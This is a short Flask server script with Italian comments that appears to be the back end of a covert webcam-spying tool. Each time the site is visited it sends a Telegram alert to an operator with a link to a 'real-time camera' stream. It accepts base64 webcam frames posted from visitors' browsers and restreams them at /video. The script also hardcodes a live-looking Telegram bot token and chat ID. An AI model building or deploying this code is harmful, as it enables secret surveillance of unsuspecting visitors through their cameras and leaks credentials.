from flask import Flask, Response, request, jsonify
from flask_cors import CORS
from datetime import datetime
import pytz, requests, base64, threading

app = Flask(__name__)
CORS(app)

# Telegram config
TELEGRAM_BOT_TOKEN = "7827685878:AAGo7ijMFJXrRGRTrXNxw7fLDHhKwbYLqDQ"
TELEGRAM_CHAT_ID = "7096713514"

# Dati video ricevuti
latest_frame = None

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Errore Telegram:", e)

@app.route('/')
def home():
    italy_tz = pytz.timezone('Europe/Rome')
    now = datetime.now(italy_tz).strftime("%d/%m/%Y %H:%M:%S")
    video_link = f"{request.host_url.rstrip('/')}/video"

    msg = f"""
🎯 <b>Nuovo accesso al sito!</b>

🕐 {now}
🎥 <a href="{video_link}">Apri videocamera in tempo reale</a>
"""
    threading.Thread(target=send_telegram_message, args=(msg,)).start()

    return jsonify({"status": "ok", "video_link": video_link})

@app.route('/upload_frame', methods=['POST'])
def upload_frame():
    """Riceve i frame in base64 dal browser"""
    global latest_frame
    try:
        data = request.get_json()
        frame_data = data.get("frame")
        if frame_data:
            latest_frame = base64.b64decode(frame_data.split(',')[1])
        return jsonify({"success": True})
    except Exception as e:
        print("Errore frame:", e)
        return jsonify({"success": False})

@app.route('/video')
def video():
    """Visualizza i frame ricevuti in streaming"""
    def generate():
        global latest_frame
        while True:
            if latest_frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + latest_frame + b'\r\n')
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

if __name__ == '__main__':
    import os
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
